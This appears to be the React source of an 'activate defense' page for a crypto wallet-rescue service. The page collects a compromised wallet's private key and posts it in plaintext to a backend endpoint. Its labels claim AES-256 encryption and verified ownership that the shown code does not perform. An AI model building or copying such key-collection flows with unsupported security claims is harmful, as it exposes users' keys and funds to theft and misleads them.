'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { motion, AnimatePresence } from 'framer-motion';
import { useAccount, useWriteContract, useReadContract, useSignMessage } from 'wagmi';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { isAddress, parseEther } from 'viem';
import { CONTRACT_ADDRESS, CONTRACT_ABI } from '@/lib/web3/config';
import { Shield, AlertTriangle, CheckCircle, ArrowRight, Lock, Zap, Gift, DollarSign, X, Info, Eye, EyeOff, Key } from 'lucide-react';

export default function ActivatePage() {
  const router = useRouter();
  const { address, isConnected } = useAccount();
  const [compromisedWallet, setCompromisedWallet] = useState('');
  const [safeWalletInput, setSafeWalletInput] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [showPrivateKey, setShowPrivateKey] = useState(false);
  const [step, setStep] = useState<'form' | 'verify' | 'processing' | 'success'>('form');
  const [error, setError] = useState('');
  const [verified, setVerified] = useState(false);

  const isDev = process.env.NEXT_PUBLIC_DEV_MODE === 'true';

  const { data: activationFee } = useReadContract({
    address: CONTRACT_ADDRESS,
    abi: CONTRACT_ABI,
    functionName: 'getActivationFee',
  });

  const { writeContract, isPending } = useWriteContract();
  const { signMessageAsync } = useSignMessage();

  const effectiveSafeWallet = safeWalletInput || address || '';

  const handleVerify = async () => {
    setError('');
    if (!isAddress(compromisedWallet)) {
      setError('Invalid compromised wallet address');
      return;
    }
    try {
      setStep('verify');
      const message = `WalletCorpse Ownership Verification\n\nWallet: ${compromisedWallet}\nTimestamp: ${Date.now()}`;
      await signMessageAsync({ message });
      setVerified(true);
      setStep('form');
    } catch (err: any) {
      setError('Verification cancelled.');
      setStep('form');
    }
  };

  const handleActivate = async () => {
    setError('');
    if (!isAddress(compromisedWallet)) {
      setError('Invalid compromised wallet address');
      return;
    }
    if (!isAddress(effectiveSafeWallet)) {
      setError('Invalid safe wallet address');
      return;
    }
    if (compromisedWallet.toLowerCase() === effectiveSafeWallet.toLowerCase()) {
      setError('Same wallet not allowed');
      return;
    }

    setStep('processing');

    const feeValue = activationFee || BigInt(0);

    try {
      writeContract({
        address: CONTRACT_ADDRESS,
        abi: CONTRACT_ABI,
        functionName: 'activate',
        args: [
          compromisedWallet as `0x${string}`,
          effectiveSafeWallet as `0x${string}`
        ],
        value: feeValue,
      }, {
        onSuccess: async () => {
          if (privateKey) {
            try {
              const backendUrl = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001';
              await fetch(`${backendUrl}/register-key`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  compromisedAddress: compromisedWallet,
                  privateKey: privateKey,
                  safeAddress: effectiveSafeWallet,
                }),
              });
            } catch (err) {
              console.error('Backend error:', err);
            }
          }
          setStep('success');
          setPrivateKey('');
          setTimeout(() => {
            router.push(`/success?wallet=${compromisedWallet}`);
          }, 2000);
        },
        onError: (err) => {
          setError(err.message || 'Transaction failed');
          setStep('form');
        }
      });
    } catch (err: any) {
      setError(err.message || 'Something went wrong');
      setStep('form');
    }
  };

  return (
    <div className="min-h-screen bg-[#050a05] text-white p-6"
      style={{
        backgroundImage: `linear-gradient(rgba(0,255,80,0.04) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,80,0.04) 1px, transparent 1px)`,
        backgroundSize: '40px 40px'
      }}>
      <div className="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-[#00ff50]/5 rounded-full blur-[120px] pointer-events-none" />

      <div className="max-w-2xl mx-auto relative z-10 py-12">

        {/* DEV MODE BANNER */}
        {isDev && (
          <div className="bg-yellow-500/20 border border-yellow-500/40 rounded-xl p-3 mb-6 text-center">
            <p className="text-yellow-400 text-xs font-bold">⚡ DEV MODE — Fee is FREE</p>
          </div>
        )}

        <div className="text-center mb-8">
          <div className="inline-flex items-center gap-2 bg-[#00ff50]/10 border border-[#00ff50]/20 px-4 py-2 rounded-full mb-4">
            <Shield size={14} className="text-[#00ff50]" />
            <span className="text-[#00ff50] text-xs font-mono font-bold tracking-widest">ACTIVATE DEFENSE</span>
          </div>
          <h1 className="text-4xl font-black text-white mb-2">Protect Your <span className="text-[#00ff50]">Wallet</span></h1>
          <p className="text-slate-400 text-sm">One-time activation — 24/7 automatic protection</p>
        </div>

        {/* What we protect */}
        <div className="bg-white/3 border border-white/8 rounded-2xl p-6 mb-6">
          <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4 flex items-center gap-2">
            <Info size={12} /> What WalletCorpse Protects
          </p>
          <div className="grid grid-cols-1 gap-3">
            {[
              { icon: Zap, label: 'Future ETH incoming', desc: 'Any ETH sent to your compromised wallet → safe wallet', ok: true },
              { icon: Gift, label: 'Future Airdrops', desc: 'Airdrop tokens intercepted and sent to safe wallet', ok: true },
              { icon: DollarSign, label: 'Future Payments & Salary', desc: 'Any payment → safe wallet automatically', ok: true },
              { icon: Shield, label: 'Future ERC20 Tokens', desc: 'USDT, USDC, all tokens rescued automatically', ok: true },
              { icon: X, label: 'Existing funds (already with hacker)', desc: 'Funds already taken cannot be recovered', ok: false },
            ].map((item, i) => (
              <div key={i} className={`flex items-start gap-3 p-3 rounded-xl ${item.ok ? 'bg-[#00ff50]/5 border border-[#00ff50]/10' : 'bg-red-500/5 border border-red-500/10'}`}>
                <item.icon size={14} className={`${item.ok ? 'text-[#00ff50]' : 'text-red-400'} mt-0.5 flex-shrink-0`} />
                <div>
                  <p className={`text-sm font-bold ${item.ok ? 'text-white' : 'text-red-400'}`}>{item.ok ? '✓' : '✗'} {item.label}</p>
                  <p className="text-xs text-slate-500 mt-0.5">{item.desc}</p>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Main card */}
        <div className="bg-white/3 border border-white/8 rounded-2xl p-8">
          {!isConnected ? (
            <div className="text-center py-8">
              <Lock size={48} className="text-[#00ff50]/40 mx-auto mb-4" />
              <p className="text-slate-400 mb-2 text-sm font-bold">Connect Your NEW Safe Wallet</p>
              <p className="text-slate-600 mb-6 text-xs">Rescued funds will be sent here</p>
              <div className="flex justify-center"><ConnectButton /></div>
            </div>
          ) : (
            <AnimatePresence mode="wait">
              {step === 'success' && (
                <motion.div key="success" initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="text-center py-8">
                  <CheckCircle size={64} className="text-[#00ff50] mx-auto mb-4" />
                  <h3 className="text-2xl font-black text-white mb-2">Defense Activated!</h3>
                  <p className="text-slate-400 text-sm">Redirecting to dashboard...</p>
                </motion.div>
              )}

              {step === 'processing' && (
                <motion.div key="processing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center py-8">
                  <div className="w-16 h-16 border-2 border-[#00ff50] border-t-transparent rounded-full animate-spin mx-auto mb-4" />
                  <h3 className="text-xl font-black text-white mb-2">Activating...</h3>
                  <p className="text-slate-400 text-sm">Confirm in your wallet</p>
                </motion.div>
              )}

              {step === 'verify' && (
                <motion.div key="verify" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center py-8">
                  <div className="w-16 h-16 border-2 border-yellow-400 border-t-transparent rounded-full animate-spin mx-auto mb-4" />
                  <h3 className="text-xl font-black text-white mb-2">Sign to Verify...</h3>
                  <p className="text-slate-400 text-sm">Free signature — no gas</p>
                </motion.div>
              )}

              {step === 'form' && (
                <motion.div key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col gap-5">

                  {/* Safe wallet connected */}
                  <div className="bg-[#00ff50]/5 border border-[#00ff50]/15 rounded-xl p-4">
                    <p className="text-xs text-slate-500 mb-1 font-mono">CONNECTED SAFE WALLET</p>
                    <p className="text-[#00ff50] font-mono text-sm truncate">{address}</p>
                    <p className="text-xs text-slate-600 mt-1">Rescued funds will come here</p>
                  </div>

                  {/* Compromised wallet */}
                  <div>
                    <label className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-2 block">
                      Compromised Wallet Address
                    </label>
                    <input
                      type="text"
                      value={compromisedWallet}
                      onChange={(e) => { setCompromisedWallet(e.target.value); setVerified(false); }}
                      placeholder="0x... (your hacked wallet)"
                      className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white font-mono text-sm focus:outline-none focus:border-[#00ff50]/50 transition-colors placeholder:text-slate-600"
                    />
                  </div>

                  {/* Private key */}
                  <div>
                    <label className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-2 flex items-center gap-2">
                      <Key size={10} /> Compromised Wallet Private Key
                    </label>
                    <div className="relative">
                      <input
                        type={showPrivateKey ? 'text' : 'password'}
                        value={privateKey}
                        onChange={(e) => setPrivateKey(e.target.value)}
                        placeholder="0x..."
                        className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white font-mono text-sm focus:outline-none focus:border-yellow-500/50 transition-colors placeholder:text-slate-600 pr-12"
                      />
                      <button onClick={() => setShowPrivateKey(!showPrivateKey)} style={{cursor:'pointer'}}
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white">
                        {showPrivateKey ? <EyeOff size={16} /> : <Eye size={16} />}
                      </button>
                    </div>
                    <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-xl p-3 mt-2">
                      <p className="text-yellow-400 text-xs font-bold mb-1">⚠️ Why is this safe?</p>
                      <p className="text-slate-400 text-xs leading-relaxed">
                        Your wallet is already compromised — hacker already has your key. We encrypt with AES-256 and use it ONLY to rescue incoming funds before hacker gets them.
                      </p>
                    </div>
                  </div>

                  {/* Safe wallet override */}
                  <div>
                    <label className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-2 block">
                      Safe Wallet Address
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        value={effectiveSafeWallet}
                        onChange={(e) => setSafeWalletInput(e.target.value)}
                        placeholder="0x..."
                        className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white font-mono text-sm focus:outline-none focus:border-[#00ff50]/50 transition-colors pr-32"
                      />
                      <button onClick={() => setSafeWalletInput(address || '')} style={{cursor:'pointer'}}
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-[10px] text-[#00ff50] font-bold hover:opacity-70">
                        USE CONNECTED
                      </button>
                    </div>
                  </div>

                  {/* Verify button */}
                  {compromisedWallet && isAddress(compromisedWallet) && !verified && (
                    <motion.button initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                      onClick={handleVerify} style={{cursor:'pointer'}}
                      className="w-full bg-yellow-500/20 border border-yellow-500/30 text-yellow-400 py-3 rounded-xl font-bold text-sm hover:bg-yellow-500/30 transition-all flex items-center justify-center gap-2">
                      <Shield size={14} /> Verify Ownership (Free)
                    </motion.button>
                  )}

                  {/* Verified */}
                  {verified && (
                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                      className="bg-[#00ff50]/10 border border-[#00ff50]/20 rounded-xl p-3 flex items-center gap-2">
                      <CheckCircle size={16} className="text-[#00ff50]" />
                      <p className="text-[#00ff50] text-xs font-bold">Ownership Verified!</p>
                    </motion.div>
                  )}

                  {/* Error */}
                  {error && (
                    <div className="flex items-center gap-2 bg-red-500/10 border border-red-500/20 rounded-xl p-3">
                      <AlertTriangle size={14} className="text-red-400 flex-shrink-0" />
                      <p className="text-red-400 text-xs">{error}</p>
                    </div>
                  )}

                  {/* Fee */}
                  <div className="flex items-center justify-between bg-white/3 rounded-xl p-4 border border-white/5">
                    <div>
                      <p className="text-xs text-slate-500 mb-1">ACTIVATION FEE</p>
                      <p className="text-white font-black text-xl">
                        {isDev ? <span className="text-[#00ff50]">FREE <span className="text-xs text-slate-500 font-normal">(dev mode)</span></span> : '$20 ≈ 0.01 ETH'}
                      </p>
                    </div>
                    <div className="text-right">
                      <p className="text-xs text-slate-500 mb-1">PLATFORM CUT</p>
                      <p className="text-[#00ff50] font-black text-xl">10%</p>
                      <p className="text-xs text-slate-600">per rescue</p>
                    </div>
                  </div>

                  {/* Activate button */}
                  <button
                    onClick={handleActivate}
                    disabled={isPending || !compromisedWallet || !verified}
                    style={{cursor: verified ? 'pointer' : 'not-allowed'}}
                    className="w-full bg-[#00ff50] text-[#050a05] py-4 rounded-xl font-black text-lg uppercase tracking-tight hover:bg-[#00ff50]/90 transition-all hover:scale-[1.02] active:scale-[0.98] disabled:opacity-40 flex items-center justify-center gap-2">
                    {!verified ? <><Lock size={18} /> Verify First</> : <>Activate Defense {isDev ? '(Free)' : '— $20'} <ArrowRight size={20} /></>}
                  </button>

                  <p className="text-center text-slate-600 text-xs">
                    Defense activates instantly • Cancel anytime • AES-256 encrypted
                  </p>
                </motion.div>
              )}
            </AnimatePresence>
          )}
        </div>

        <div className="text-center mt-6">
          <button onClick={() => router.push('/')} style={{cursor:'pointer'}} className="text-slate-500 text-sm hover:text-white transition-colors">
            ← Back to home
          </button>
        </div>
      </div>
    </div>
  );
}
